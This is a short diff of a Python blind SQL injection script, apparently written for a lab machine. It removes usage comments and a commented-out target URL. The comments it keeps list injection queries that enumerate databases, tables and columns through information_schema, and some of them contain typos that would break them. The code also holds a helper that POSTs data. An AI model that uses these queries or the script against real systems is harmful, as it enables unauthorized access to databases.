@@ -1,5 +1,3 @@
-# usage
-#python blind-sql.py "query"
 #list db "select group_concat(schema_name) from information_schema.schemata limit 1"
 #list tabels "select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1"
 #list columns "select group_concat(colum_name) from information_schema.column where table_name='tablename' limit 1"
@@ -8,12 +6,6 @@
 import requests
 import sys
 from optparse import OptionParser
-
-
-#base_url = "http://10.10.10.73/login.php"
-#base_url = parser.u
-#session = requests.Session()
-#true = "Wrong identification"
 
 def send_data(url, data):
     return session.post(format(url), data)
